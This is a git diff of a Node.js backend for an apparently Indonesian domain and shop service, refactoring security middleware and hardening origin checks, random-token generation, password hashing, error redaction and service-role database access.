@@ -13488,7 +17683,7 @@ function orderMailItemsHtml(items, currency = 'IDR') {
   return `<table role="presentation" cellspacing="0" cellpadding="0" border="0" style="border-collapse:separate;border-spacing:0;width:100%;border:1px solid #4b5563;border-radius:14px;overflow:hidden;background:#2b2f36;background-color:#2b2f36;color:#ffffff!important;-webkit-text-fill-color:#ffffff!important;mso-color-alt:#ffffff"><thead><tr><th style="padding:12px 14px;text-align:left;background:#2b2f36;background-color:#2b2f36;color:#ffffff!important;-webkit-text-fill-color:#ffffff!important;mso-color-alt:#ffffff;font-size:12px;text-transform:uppercase;letter-spacing:.04em">#</th><th style="padding:12px 14px;text-align:left;background:#2b2f36;background-color:#2b2f36;color:#ffffff!important;-webkit-text-fill-color:#ffffff!important;mso-color-alt:#ffffff;font-size:12px;text-transform:uppercase;letter-spacing:.04em">Item</th><th style="padding:12px 14px;text-align:center;background:#2b2f36;background-color:#2b2f36;color:#ffffff!important;-webkit-text-fill-color:#ffffff!important;mso-color-alt:#ffffff;font-size:12px;text-transform:uppercase;letter-spacing:.04em">Qty</th><th style="padding:12px 14px;text-align:right;background:#2b2f36;background-color:#2b2f36;color:#ffffff!important;-webkit-text-fill-color:#ffffff!important;mso-color-alt:#ffffff;font-size:12px;text-transform:uppercase;letter-spacing:.04em">Subtotal</th></tr></thead><tbody>${body}</tbody></table>`;
 }
 function orderMailProductCardsHtml(items, currency = 'IDR') {
-  const rows = (Array.isArray(items) ? items : []).filter((item) => item && (item.image_url || item.title)).slice(0, 3);
+  const rows = (Array.isArray(items) ? items : []).filter((item) => item && (item.image_url || item.title));
   if (!rows.length) return '';
   const cards = rows.map((item) => {
     const image = orderMailAssetUrl(item.image_url || item.img || '') || orderMailDefaultProductImageUrl();
@@ -13573,9 +17768,7 @@ async function orderMailSendViaSmtp(config, message) {
 
     const run = async () => {
       resetTimer();
-      socket = config.secure
-        ? tls.connect({ host, port, servername: host, rejectUnauthorized: true })
-        : net.connect({ host, port });
+      socket = await diracCentralOpenSmtpSocketV230(host, port, config.secure === true, timeoutMs);
       socket.setEncoding('utf8');
       socket.on('error', fail);
       socket.on('data', (chunk) => { buffer += chunk.toString('utf8'); });
@@ -13588,7 +17781,7 @@ async function orderMailSendViaSmtp(config, message) {
         socket.removeAllListeners('data');
         socket.removeAllListeners('error');
         buffer = '';
-        socket = tls.connect({ socket, servername: host, rejectUnauthorized: true });
+        socket = diracCentralUpgradeSmtpTlsV230(socket, host);
         socket.setEncoding('utf8');
         socket.on('error', fail);
         socket.on('data', (chunk) => { buffer += chunk.toString('utf8'); });
@@ -13762,9 +17955,7 @@ function orderMailServiceLabel(value) {
 }
 
 function orderMailSafeError(error) {
-  const message = String(error && error.message ? error.message : error || 'email_error');
-  if (/password|pass|secret|token|authorization|apikey|api_key/i.test(message)) return 'email_internal_error';
-  return orderMailCleanText(message, 160);
+  return diracSecurityRedactDiagnosticV210(error || 'email_error', 160);
 }
 
 
@@ -13783,7 +17974,7 @@ function orderMailSafeError(error) {
    ============================================================ */
 
 const DIRAC_SENSITIVE_POST_ORIGIN_GUARD_PATCH = 'sensitive-post-origin-guard-v1';
-const __diracSensitivePostOriginGuardPreviousHandler = module.exports;
+const __diracSensitivePostOriginGuardPreviousHandler = __diracV202DispatcherSentinel;
 
 const DIRAC_SENSITIVE_POST_ORIGIN_ACTIONS = new Set([
   'domain_logout',
@@ -13799,7 +17990,7 @@ const DIRAC_SENSITIVE_POST_ORIGIN_ACTIONS = new Set([
   'dirac_mfa_passkey_verify'
 ]);
 
-module.exports = async function diracSensitivePostOriginGuardWrapper(req, res) {
+__diracV202RegisterMiddleware(async function diracSensitivePostOriginGuardWrapper(req, res, nextHandlerV202) {
   const method = String((req && req.method) || '').toUpperCase();
   const rawAction = String((req && req.query && req.query.action) || '').trim();
   const action = diracSensitivePostOriginNormalizeAction(rawAction);
@@ -13821,8 +18012,8 @@ module.exports = async function diracSensitivePostOriginGuardWrapper(req, res) {
     }
   }
 
-  return __diracSensitivePostOriginGuardPreviousHandler(req, res);
-};
+  return nextHandlerV202(req, res);
+}, "diracSensitivePostOriginGuardWrapper");
 
 function diracSensitivePostOriginNormalizeAction(action) {
   const clean = String(action || '').trim().toLowerCase().replace(/[\s-]+/g, '_');
@@ -13861,12 +18052,12 @@ function diracSensitivePostOriginNormalizeAction(action) {
 
 function diracSensitivePostOriginCheck(req, action) {
   if (isEnvTrue('DIRAC_SENSITIVE_POST_ORIGIN_GUARD_DISABLED')) {
-    return { ok: true, source: 'guard_disabled' };
+    return { ok: false, code: 'SENSITIVE_POST_ORIGIN_GUARD_DISABLE_FORBIDDEN', source: 'guard_disable_forbidden' };
   }
 
   const scopedDisabledKey = 'DIRAC_SENSITIVE_POST_ORIGIN_GUARD_DISABLED_' + String(action || '').toUpperCase().replace(/[^A-Z0-9]+/g, '_');
   if (isEnvTrue(scopedDisabledKey)) {
-    return { ok: true, source: 'scope_guard_disabled' };
+    return { ok: false, code: 'SENSITIVE_POST_ORIGIN_SCOPE_DISABLE_FORBIDDEN', source: 'scope_guard_disable_forbidden' };
   }
 
   const headers = (req && req.headers) || {};
@@ -13893,11 +18084,7 @@ function diracSensitivePostOriginCheck(req, action) {
       : { ok: false, code: 'SENSITIVE_POST_REFERER_BLOCKED', source: 'referer' };
   }
 
-  if (isEnvTrue('DIRAC_SENSITIVE_POST_ORIGIN_REQUIRE_HEADER')) {
-    return { ok: false, code: 'SENSITIVE_POST_ORIGIN_HEADER_REQUIRED', source: 'missing_origin_referer' };
-  }
-
-  return { ok: true, source: 'missing_origin_fail_open' };
+  return { ok: false, code: 'SENSITIVE_POST_ORIGIN_HEADER_REQUIRED', source: 'missing_origin_referer' };
 }
 
 function diracSensitivePostAllowedOrigins() {
@@ -13946,7 +18133,7 @@ function diracSensitivePostNormalizeOrigin(value) {
      customer_security_account_request, customer_security_recovery_codes_generate.
    ============================================================ */
 
-const __diracCustomerSecurityFeatureReadPreviousHandler = module.exports;
+const __diracCustomerSecurityFeatureReadPreviousHandler = __diracV202DispatcherSentinel;
 
 const CUSTOMER_SECURITY_FEATURE_READ_ACTIONS = new Set([
   'customer_security_features_bundle',
@@ -13972,14 +18159,14 @@ const CUSTOMER_SECURITY_FEATURE_READ_ALIASES = Object.freeze({
   'customer_security_request_tracker': 'customer_security_request_tracker'
 });
 
-module.exports = async function customerSecurityFeatureReadWrapper(req, res) {
+__diracV202RegisterMiddleware(async function customerSecurityFeatureReadWrapper(req, res, nextHandlerV202) {
   diracApplySecurityResponseHeaders(res);
 
   const rawAction = String((req.query && req.query.action) || '').trim();
   const action = customerSecurityFeatureReadNormalizeAction(rawAction);
 
   if (!CUSTOMER_SECURITY_FEATURE_READ_ACTIONS.has(action)) {
-    return __diracCustomerSecurityFeatureReadPreviousHandler(req, res);
+    return nextHandlerV202(req, res);
   }
 
   const cors = setCors(req, res, { isDomainAction: true });
@@ -14094,7 +18281,7 @@ module.exports = async function customerSecurityFeatureReadWrapper(req, res) {
       message: diracSafePublicMessage('Gagal membaca fitur keamanan lanjutan.')
     });
   }
-};
+}, "customerSecurityFeatureReadWrapper");
 
 function customerSecurityFeatureReadNormalizeAction(action) {
   const clean = String(action || '').trim().toLowerCase();
@@ -14384,7 +18571,7 @@ function customerSecurityFeaturePolicy() {
    - Tidak menyentuh login, hash, payment, email template, A2F/MFA, cookie, atau action lama.
    ============================================================ */
 
-const __diracCustomerSecurityFeatureActionsPreviousHandler = module.exports;
+const __diracCustomerSecurityFeatureActionsPreviousHandler = __diracV202DispatcherSentinel;
 
 const CUSTOMER_SECURITY_FEATURE_ACTIONS_V2 = new Set([
   'customer_security_features_bundle_v2',
@@ -14404,14 +18591,14 @@ const CUSTOMER_SECURITY_FEATURE_ACTION_ALIASES_V2 = Object.freeze({
   'customer_security_prune_login_history': 'customer_security_prune_login_history'
 });
 
-module.exports = async function customerSecurityFeatureActionsWrapperV2(req, res) {
+__diracV202RegisterMiddleware(async function customerSecurityFeatureActionsWrapperV2(req, res, nextHandlerV202) {
   diracApplySecurityResponseHeaders(res);
 
   const rawAction = String((req.query && req.query.action) || '').trim();
   const action = customerSecurityFeatureActionNormalizeV2(rawAction);
 
   if (!CUSTOMER_SECURITY_FEATURE_ACTIONS_V2.has(action)) {
-    return __diracCustomerSecurityFeatureActionsPreviousHandler(req, res);
+    return nextHandlerV202(req, res);
   }
 
   const cors = setCors(req, res, { isDomainAction: true });
@@ -14448,7 +18635,7 @@ module.exports = async function customerSecurityFeatureActionsWrapperV2(req, res
       message: diracSafePublicMessage('Fitur keamanan belum bisa diproses.')
     });
   }
-};
+}, "customerSecurityFeatureActionsWrapperV2");
 
 function customerSecurityFeatureActionNormalizeV2(action) {
   const clean = String(action || '').trim().toLowerCase();
@@ -14688,7 +18875,7 @@ function customerSecurityFeaturePolicyV2() {
    - Tidak menyentuh login, hash, payment, email template, A2F/MFA, cookie, atau action payment.
    ============================================================ */
 
-const __diracCustomerSecurityOverviewSessionLimitPreviousHandler = module.exports;
+const __diracCustomerSecurityOverviewSessionLimitPreviousHandler = __diracV202DispatcherSentinel;
 
 const CUSTOMER_SECURITY_OVERVIEW_LIMIT_ACTIONS_V3 = new Set([
   'customer_security_overview',
@@ -14711,14 +18898,14 @@ const CUSTOMER_SECURITY_OVERVIEW_LIMIT_ALIASES_V3 = Object.freeze({
   'customer_security_features_bundle_v3': 'customer_security_features_bundle_v3'
 });
 
-module.exports = async function customerSecurityOverviewSessionLimitWrapperV3(req, res) {
+__diracV202RegisterMiddleware(async function customerSecurityOverviewSessionLimitWrapperV3(req, res, nextHandlerV202) {
   diracApplySecurityResponseHeaders(res);
 
   const rawAction = String((req.query && req.query.action) || '').trim();
   const action = customerSecurityOverviewLimitNormalizeV3(rawAction);
 
   if (!CUSTOMER_SECURITY_OVERVIEW_LIMIT_ACTIONS_V3.has(action)) {
-    return __diracCustomerSecurityOverviewSessionLimitPreviousHandler(req, res);
+    return nextHandlerV202(req, res);
   }
 
   const cors = setCors(req, res, { isDomainAction: true });
@@ -14745,7 +18932,7 @@ module.exports = async function customerSecurityOverviewSessionLimitWrapperV3(re
       message: diracSafePublicMessage('Data keamanan belum bisa dibaca.')
     });
   }
-};
+}, "customerSecurityOverviewSessionLimitWrapperV3");
 
 function customerSecurityOverviewLimitNormalizeV3(action) {
   const clean = String(action || '').trim().toLowerCase();
@@ -15005,11 +19192,12 @@ function customerSecurityFeaturePolicyV3() {
    ============================================================ */
 
 const DIRAC_ULTRA_SECURITY_PATCH = 'dirac-ultra-security-hardening-v100';
-const __diracUltraSecurityPreviousHandler = module.exports;
+const DIRAC_ULTRA_RECOVERY_HPKE_RESPONSE_MARKER_V191 = Symbol('dirac-ultra-recovery-hpke-proof-response-v190');
+const __diracUltraSecurityPreviousHandler = __diracV202DispatcherSentinel;
 const DIRAC_ULTRA_RATE_LIMIT_STORE = globalThis.__DIRAC_ULTRA_RATE_LIMIT_STORE__ || new Map();
 globalThis.__DIRAC_ULTRA_RATE_LIMIT_STORE__ = DIRAC_ULTRA_RATE_LIMIT_STORE;
 
-module.exports = async function diracUltraSecurityHardeningWrapper(req, res) {
+__diracV202RegisterMiddleware(async function diracUltraSecurityHardeningWrapper(req, res, nextHandlerV202) {
   diracUltraApplyResponseHeaders(res);
   diracUltraInstallSafeJsonInterceptor(res);
 
@@ -15038,7 +19226,7 @@ module.exports = async function diracUltraSecurityHardeningWrapper(req, res) {
       });
     }
 
-    return await __diracUltraSecurityPreviousHandler(req, res);
+    return await nextHandlerV202(req, res);
   } catch (error) {
     const status = Number(error && (error.statusCode || error.status)) || 500;
     if (status === 413 || String(error && error.code || '') === 'DIRAC_BODY_TOO_LARGE') {
@@ -15058,7 +19246,7 @@ module.exports = async function diracUltraSecurityHardeningWrapper(req, res) {
         : diracUltraSafePublicMessage(error && error.message, 'Permintaan ditolak oleh sistem keamanan.')
     });
   }
-};
+}, "diracUltraSecurityHardeningWrapper");
 
 function diracUltraPreflightSecurityCheck(req, res, action, method) {
   const bodyLimit = diracUltraBodyLimitBytes(action, method);
@@ -15140,15 +19328,20 @@ function diracUltraRedactPayload(payload, depth = 0, parentKey = '') {
 
   const parent = String(parentKey || '').toLowerCase();
   if (typeof payload === 'string') {
+    if (parent === 'website_recovery_code' && /^[A-Za-z0-9_-]{100}$/.test(payload)) return payload;
     // HOTFIX: setupToken/mfaSetupToken adalah challenge sementara A2F/Passkey
     // yang memang WAJIB sampai ke browser. Jangan dianggap JWT secret, karena
     // kalau diredact browser mengirim token palsu dan muncul "Challenge Passkey tidak valid".
     if (diracUltraIsSafeChallengeResponseKey(parent)) return payload;
+    if (parent === 'version' && payload === 'dirac-recovery-hpke-proof-response-v191') return payload;
     return diracUltraRedactString(payload);
   }
 
   if (typeof payload !== 'object') return payload;
   if (Array.isArray(payload)) return payload.map((item) => diracUltraRedactPayload(item, depth + 1, parentKey));
+
+  const preservedRecoveryHpkeProofResponse = diracUltraPreserveRecoveryHpkeProofResponseV191(payload);
+  if (preservedRecoveryHpkeProofResponse) return preservedRecoveryHpkeProofResponse;
 
   const out = {};
   for (const [key, value] of Object.entries(payload)) {
@@ -15182,6 +19375,68 @@ function diracUltraIsSafeChallengeResponseKey(key) {
     || lower === 'csrf'
     || lower === 'csrftoken'
     || lower === 'csrf_token';
+}
+
+function diracUltraCanonicalBase64UrlV191(value, minBytes, maxBytes) {
+  const text = typeof value === 'string' ? value : '';
+  const min = Number(minBytes);
+  const max = Number(maxBytes);
+  if (!text || !Number.isSafeInteger(min) || !Number.isSafeInteger(max) || min < 0 || max < min) return false;
+  if (!/^[A-Za-z0-9_-]+$/.test(text) || text.length % 4 === 1) return false;
+  let decoded = null;
+  try {
+    decoded = Buffer.from(text, 'base64url');
+    return decoded.length >= min
+      && decoded.length <= max
+      && decoded.toString('base64url') === text;
+  } catch (_) {
+    return false;
+  } finally {
+    if (decoded) decoded.fill(0);
+  }
+}
+
+function diracUltraPreserveRecoveryHpkeProofResponseV191(payload) {
+  if (!payload || typeof payload !== 'object' || Array.isArray(payload)) return null;
+  if (payload[DIRAC_ULTRA_RECOVERY_HPKE_RESPONSE_MARKER_V191] !== true) return null;
+
+  const expectedKeys = [
+    'auth_tag_b64url',
+    'ciphertext_b64url',
+    'nonce_b64url',
+    'proof_nonce',
+    'request_id',
+    'status',
+    'version'
+  ];
+  const actualKeys = Object.keys(payload).sort();
+  if (actualKeys.length !== expectedKeys.length || actualKeys.some((key, index) => key !== expectedKeys[index])) return null;
+
+  const version = String(payload.version || '');
+  const status = Number(payload.status);
+  const requestId = String(payload.request_id || '');
+  const proofNonce = String(payload.proof_nonce || '');
+  const nonceB64url = String(payload.nonce_b64url || '');
+  const ciphertextB64url = String(payload.ciphertext_b64url || '');
+  const authTagB64url = String(payload.auth_tag_b64url || '');
+
+  if (version !== 'dirac-recovery-hpke-proof-response-v191') return null;
+  if (!Number.isSafeInteger(status) || status < 100 || status > 599) return null;
+  if (!/^[A-Za-z0-9_-]{16,120}$/.test(requestId)) return null;
+  if (!/^[A-Za-z0-9_-]{32,120}$/.test(proofNonce)) return null;
+  if (!diracUltraCanonicalBase64UrlV191(nonceB64url, 12, 12)) return null;
+  if (!diracUltraCanonicalBase64UrlV191(ciphertextB64url, 1, 128 * 1024)) return null;
+  if (!diracUltraCanonicalBase64UrlV191(authTagB64url, 16, 16)) return null;
+
+  return {
+    version,
+    status,
+    request_id: requestId,
+    proof_nonce: proofNonce,
+    nonce_b64url: nonceB64url,
+    ciphertext_b64url: ciphertextB64url,
+    auth_tag_b64url: authTagB64url
+  };
 }
 
 function diracUltraRedactString(value) {
@@ -15263,7 +19518,6 @@ function diracUltraIsWebhookAction(action) {
 
 function diracUltraRequiresBrowserOrigin(action) {
   if (diracUltraIsWebhookAction(action)) return false;
-  if (isEnvTrue('DIRAC_ULTRA_ORIGIN_GUARD_DISABLED')) return false;
   return true;
 }
 
@@ -15278,7 +19532,7 @@ function diracUltraStrictOriginGuard(req, action) {
     }
     return guard;
   }
-  return { ok: true, source: 'origin_guard_unavailable' };
+  return { ok: false, code: 'ORIGIN_GUARD_UNAVAILABLE', source: 'origin_guard_unavailable' };
 }
 
 // Override existing sensitive POST origin checker only at the missing-header branch.
@@ -15426,7 +19680,7 @@ async function diracUltraWriteGenericSecurityEvent(req, options = {}) {
   if (!isEnvTrue('DIRAC_ULTRA_GENERIC_SECURITY_EVENT')) return false;
   if (!LOGIN_SECURITY_PERSIST_TABLE || typeof writePersistentSecurityJson !== 'function') return false;
   const action = String(options.action || '').slice(0, 80);
-  const keyBase = [Date.now(), action, Math.random().toString(36).slice(2)].join(':');
+  const keyBase = [Date.now(), action, crypto.randomBytes(32).toString('base64url')].join(':');
   const key = 'ultra-event:' + (typeof loginSecurityHash === 'function' ? loginSecurityHash(keyBase) : crypto.createHash('sha256').update(keyBase).digest('hex'));
   const headers = (req && req.headers) || {};
   return writePersistentSecurityJson(key, {
@@ -15443,9 +19697,8 @@ async function diracUltraWriteGenericSecurityEvent(req, options = {}) {
 }
 
 function diracUltraSafeError(error) {
-  const message = String(error && error.message ? error.message : error || 'unknown_error');
-  const code = String(error && error.code || '');
-  return { code: code.slice(0, 80), message: diracUltraRedactString(message).slice(0, 300) };
+  const code = String(error && error.code || '').replace(/[^A-Za-z0-9_.-]/g, '').slice(0, 80);
+  return { code, message: diracSecurityRedactDiagnosticV210(error || 'unknown_error', 300) };
 }
 
 function diracUltraSafePublicMessage(message, fallback = 'Permintaan belum dapat diproses.') {
@@ -15490,11 +19743,11 @@ try {
    ============================================================ */
 
 const DIRAC_ULTRA_SQLMAP_GUARD_PATCH = 'dirac-ultra-sqlmap-guard-v101';
-const __diracUltraSqlmapGuardPreviousHandler = module.exports;
+const __diracUltraSqlmapGuardPreviousHandler = __diracV202DispatcherSentinel;
 const DIRAC_ULTRA_SQLMAP_MEMORY_STORE = globalThis.__DIRAC_ULTRA_SQLMAP_MEMORY_STORE__ || new Map();
 globalThis.__DIRAC_ULTRA_SQLMAP_MEMORY_STORE__ = DIRAC_ULTRA_SQLMAP_MEMORY_STORE;
 
-module.exports = async function diracUltraSqlmapGuardWrapper(req, res) {
+__diracV202RegisterMiddleware(async function diracUltraSqlmapGuardWrapper(req, res, nextHandlerV202) {
   try { diracV101InstallGenericErrorInterceptor(res, req); } catch (_) {}
 
   const action = diracV101NormalizeAction(String((req && req.query && req.query.action) || ''));
@@ -15529,8 +19782,8 @@ module.exports = async function diracUltraSqlmapGuardWrapper(req, res) {
     });
   }
 
-  return __diracUltraSqlmapGuardPreviousHandler(req, res);
-};
+  return nextHandlerV202(req, res);
+}, "diracUltraSqlmapGuardWrapper");
 
 function diracV101NormalizeAction(action) {
   try {
@@ -15803,9 +20056,8 @@ async function diracV101RegisterSqlmapAttack(req, action, method, threat) {
 }
 
 function diracV101SafeError(error) {
-  const code = String(error && error.code || '').slice(0, 80);
-  const message = String(error && error.message || error || 'unknown').replace(/password|token|secret|authorization|cookie/ig, '[redacted]').slice(0, 220);
-  return { code, message };
+  const code = String(error && error.code || '').replace(/[^A-Za-z0-9_.-]/g, '').slice(0, 80);
+  return { code, message: diracSecurityRedactDiagnosticV210(error || 'unknown', 220) };
 }
 
 function diracV101InstallGenericErrorInterceptor(res, req) {
@@ -15933,6 +20185,44 @@ function diracV101ValidateServiceRoleSupabasePath(path, options = {}) {
   if (raw.startsWith('/auth/v1/admin/users')) return { ok: true, scope: 'auth_admin_users' };
   if (!raw.startsWith('/rest/v1/')) return { ok: false, code: 'SERVICE_ROLE_SCOPE_REJECTED' };
 
+  if (raw.startsWith('/rest/v1/rpc/')) {
+    if (method !== 'POST') {
+      return { ok: false, code: 'SERVICE_ROLE_RPC_METHOD_REJECTED' };
+    }
+
+    const rpcPart = raw.slice('/rest/v1/rpc/'.length);
+    if (!rpcPart || rpcPart.includes('?') || rpcPart.includes('#') || rpcPart.includes('/')) {
+      return { ok: false, code: 'SERVICE_ROLE_RPC_INVALID' };
+    }
+
+    let rpc;
+    try {
+      rpc = decodeURIComponent(rpcPart);
+    } catch (_) {
+      return { ok: false, code: 'SERVICE_ROLE_RPC_INVALID' };
+    }
+
+    if (rpc !== rpcPart || rpc !== rpc.trim() || !/^[a-zA-Z0-9_]+$/.test(rpc)) {
+      return { ok: false, code: 'SERVICE_ROLE_RPC_INVALID' };
+    }
+
+    const allowedRpc =
+      rpc === 'dirac_central_atomic_consume_v230' ||
+      rpc === 'dirac_central_atomic_claim_record_v230' ||
+      rpc === 'dirac_central_atomic_rate_limit_v230' ||
+      rpc === 'dirac_central_security_log_v230' ||
+      rpc === 'dirac_passkey_create_pending_v237' ||
+      rpc === 'dirac_passkey_finalize_rotation_v237' ||
+      rpc === 'dirac_passkey_record_assertion_v237' ||
+      rpc === 'dirac_passkey_revoke_clone_v237';
+
+    if (!allowedRpc) {
+      return { ok: false, code: 'SERVICE_ROLE_RPC_NOT_ALLOWED' };
+    }
+
+    return { ok: true, scope: 'rest_rpc', rpc };
+  }
+
   const tablePart = raw.slice('/rest/v1/'.length).split('?')[0].split('/')[0];
   const table = decodeURIComponent(tablePart || '').trim();
   if (!/^[a-zA-Z0-9_]+$/.test(table)) return { ok: false, code: 'SERVICE_ROLE_TABLE_INVALID' };
@@ -15971,7 +20261,8 @@ function diracV101ServiceRoleAllowedTables() {
     'security_customer_sessions',
     'security_customer_settings',
     'dirac_security_rate_limits',
-    String(process.env.LOGIN_SECURITY_PERSIST_TABLE || '').trim(),
+    DIRAC_PERSISTENT_BAN_TABLE,
+    DIRAC_S2S_SECURITY_TABLE,
     String(process.env.DOMAIN_LOGIN_RATE_TABLE || '').trim()
   ];
   const extra = String(process.env.DIRAC_SERVICE_ROLE_EXTRA_TABLES || '').split(',').map((item) => item.trim()).filter(Boolean);
@@ -15988,13 +20279,19 @@ try {
       const memoryCost = Math.max(19456, Math.min(262144, Number(process.env.DIRAC_ARGON2ID_MEMORY_KIB || 65536)));
       const timeCost = Math.max(3, Math.min(6, Number(process.env.DIRAC_ARGON2ID_TIME_COST || 3)));
       const parallelism = Math.max(1, Math.min(4, Number(process.env.DIRAC_ARGON2ID_PARALLELISM || 1)));
-      return await argon2.hash(customerSecurityRecoveryCodeArgon2Input(code, customerId), {
-        type: argon2.argon2id,
-        memoryCost,
-        timeCost,
-        parallelism,
-        hashLength: 32
-      });
+      const salt = crypto.randomBytes(64);
+      try {
+        return await argon2.hash(customerSecurityRecoveryCodeArgon2Input(code, customerId), {
+          type: argon2.argon2id,
+          memoryCost,
+          timeCost,
+          parallelism,
+          hashLength: 32,
+          salt
+        });
+      } finally {
+        salt.fill(0);
+      }
     };
   }
 } catch (_) {}
@@ -16013,11 +20310,11 @@ try {
    ============================================================ */
 
 const DIRAC_GLOBAL_HARD_BAN_STABLE_PATCH_V107 = 'dirac-global-hard-ban-stable-v107';
-const __diracV107BaseHandler = module.exports;
+const __diracV107BaseHandler = __diracV202DispatcherSentinel;
 const DIRAC_GLOBAL_HARD_BAN_STORE_V107 = globalThis.__DIRAC_GLOBAL_HARD_BAN_STORE_V107__ || new Map();
 globalThis.__DIRAC_GLOBAL_HARD_BAN_STORE_V107__ = DIRAC_GLOBAL_HARD_BAN_STORE_V107;
 
-module.exports = async function diracGlobalHardBanStableWrapperV107(req, res) {
+__diracV202RegisterMiddleware(async function diracGlobalHardBanStableWrapperV107(req, res, nextHandlerV202) {
   try { if (res && typeof res.setHeader === 'function') res.setHeader('X-Dirac-Global-Hard-Ban-Patch-V107', DIRAC_GLOBAL_HARD_BAN_STABLE_PATCH_V107); } catch (_) {}
 
   const method = String((req && req.method) || 'GET').toUpperCase();
@@ -16047,8 +20344,8 @@ module.exports = async function diracGlobalHardBanStableWrapperV107(req, res) {
     return diracV107BlockedResponse(res, 'SECURITY_GUARD_ERROR');
   }
 
-  return __diracV107BaseHandler(req, res);
-};
+  return nextHandlerV202(req, res);
+}, "diracGlobalHardBanStableWrapperV107");
 
 // Jika guard SQLi v101 mendeteksi payload di body JSON, v107 ikut membuat hard-ban aktif.
 try {
@@ -16190,7 +20487,7 @@ async function diracV107RegisterHardBan(req, res, action, method, threat) {
   // Pasang cookie hard-ban untuk browser yang melakukan attack; membantu tetap blokir bila IP/VPN berubah tetapi cookie masih sama.
   try {
     if (res && typeof res.setHeader === 'function') {
-      const cookieValue = diracV107Hmac('cookie|' + String(now) + '|' + String(Math.random())).slice(0, 64);
+      const cookieValue = diracV107Hmac('cookie|' + String(now) + '|' + crypto.randomBytes(32).toString('base64url')).slice(0, 64);
       const maxAge = Math.max(60, Math.min(Math.floor((blockedUntilMs - now) / 1000), 2147483647));
       res.setHeader('Set-Cookie', 'dirac_global_hard_ban=' + cookieValue + '; Path=/; Max-Age=' + maxAge + '; HttpOnly; Secure; SameSite=Lax');
       keys.push(...diracV107KeysForValue('cookie', 'cookie|' + cookieValue));
@@ -16255,9 +20552,7 @@ function diracV107KeysForValue(type, value) {
 }
 
 function diracV107Ip(req) {
-  const headers = (req && req.headers) || {};
-  const forwarded = String(headers['x-forwarded-for'] || '').split(',')[0].trim();
-  return forwarded || String(headers['x-real-ip'] || (req && req.socket && req.socket.remoteAddress) || '').trim() || 'unknown';
+  return typeof getLoginSecurityIp === 'function' ? getLoginSecurityIp(req) : 'unknown';
 }
 
 function diracV107Cookie(req, name) {
@@ -16276,12 +20571,12 @@ function diracV107BlockYears() {
 
 function diracV107Hmac(value) {
   const secret = diracCentralDeriveSecretV146('v107-hard-ban-hmac');
-  try {
-    return crypto.createHmac('sha256', secret).update(String(value || '')).digest('hex');
-  } catch (_) {
-    try { return loginSecurityHash(String(value || '')); } catch (_) {}
-    return crypto.createHash('sha256').update(String(value || '')).digest('hex');
+  if (!Buffer.isBuffer(secret) || secret.length < 64) {
+    const error = new Error('DIRAC_V107_HMAC_SECRET_INVALID');
+    error.code = 'DIRAC_V107_HMAC_SECRET_INVALID';
+    throw error;
   }
+  return crypto.createHmac('sha256', secret).update(String(value || '')).digest('hex');
 }
 
 async function diracV107ReadRows(keys) {
@@ -16332,8 +20627,8 @@ async function diracV107WriteRows(rows) {
 
 async function diracV107DirectFetch(method, suffix, body) {
   const table = diracV107Table();
-  const supabaseUrl = String(process.env.DOMAIN_SUPABASE_URL || process.env.SUPABASE_URL || '').replace(/\/$/, '');
-  const serviceKey = String(process.env.DOMAIN_SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_SERVICE_KEY || '').trim();
+  const supabaseUrl = String(process.env.DIRAC_SECURITY_SUPABASE_URL || '').replace(/\/$/, '');
+  const serviceKey = String(process.env.DIRAC_SECURITY_SUPABASE_SERVICE_ROLE_KEY || '').trim();
   if (!table || !supabaseUrl || !serviceKey || typeof fetch !== 'function') return { ok: false, data: null };
 
   const url = supabaseUrl + '/rest/v1/' + encodeURIComponent(table) + String(suffix || '');
@@ -16346,12 +20641,12 @@ async function diracV107DirectFetch(method, suffix, body) {
   if (method === 'POST') headers.Prefer = 'resolution=merge-duplicates';
   const response = await fetch(url, { method, headers, body: body ? JSON.stringify(body) : undefined });
   let data = null;
-  try { data = await response.json(); } catch (_) {}
+  try { data = await parseFetchResponse(response, 2 * 1024 * 1024); } catch (_) {}
   return { ok: response.ok, status: response.status, data };
 }
 
 function diracV107Table() {
-  return String(process.env.LOGIN_SECURITY_PERSIST_TABLE || process.env.DOMAIN_LOGIN_RATE_TABLE || 'dirac_security_rate_limits').trim();
+  return DIRAC_PERSISTENT_BAN_TABLE;
 }
 
 function diracV107BlockedResponse(res, reason) {
@@ -16371,9 +20666,7 @@ function diracV107EnvTrue(name) {
 }
 
 function diracV107SafeError(error) {
-  const message = String(error && error.message ? error.message : error || 'error');
-  if (/password|token|secret|cookie|authorization|apikey|service_role/i.test(message)) return 'security_internal_error';
-  return message.slice(0, 180);
+  return diracSecurityRedactDiagnosticV210(error || 'security_internal_error', 180);
 }
 
 /* ============================================================
@@ -16433,23 +20726,23 @@ try {
   }
 } catch (_) {}
 
-const __diracPasswordArgon2V4PreviousHandler = module.exports;
+const __diracPasswordArgon2V4PreviousHandler = __diracV202DispatcherSentinel;
 
-module.exports = async function diracPasswordArgon2VerifiedShadowWrapperV4(req, res) {
+__diracV202RegisterMiddleware(async function diracPasswordArgon2VerifiedShadowWrapperV4(req, res, nextHandlerV202) {
   try { if (res && typeof res.setHeader === 'function') res.setHeader('X-Dirac-Password-Argon2id-Shadow-Patch', DIRAC_PASSWORD_ARGON2ID_VERIFIED_SHADOW_PATCH_V4); } catch (_) {}
 
   const action = diracPasswordArgon2V4NormalizeAction(String((req && req.query && req.query.action) || ''));
   const method = String((req && req.method) || '').toUpperCase();
 
   if (method !== 'POST' || (action !== 'domain_register' && action !== 'domain_login')) {
-    return __diracPasswordArgon2V4PreviousHandler(req, res);
+    return nextHandlerV202(req, res);
   }
 
   const originalStatus = typeof res.status === 'function' ? res.status.bind(res) : null;
   const originalJson = typeof res.json === 'function' ? res.json.bind(res) : null;
   let capturedStatus = Number(res.statusCode || 200);
 
-  if (!originalJson) return __diracPasswordArgon2V4PreviousHandler(req, res);
+  if (!originalJson) return nextHandlerV202(req, res);
 
   res.status = function diracPasswordArgon2V4Status(code) {
     capturedStatus = Number(code || capturedStatus || 200);
@@ -16468,8 +20761,8 @@ module.exports = async function diracPasswordArgon2VerifiedShadowWrapperV4(req, 
     return originalJson(payload);
   };
 
-  return __diracPasswordArgon2V4PreviousHandler(req, res);
-};
+  return nextHandlerV202(req, res);
+}, "diracPasswordArgon2VerifiedShadowWrapperV4");
 
 function diracPasswordArgon2V4NormalizeAction(action) {
   const clean = String(action || '').trim().toLowerCase();
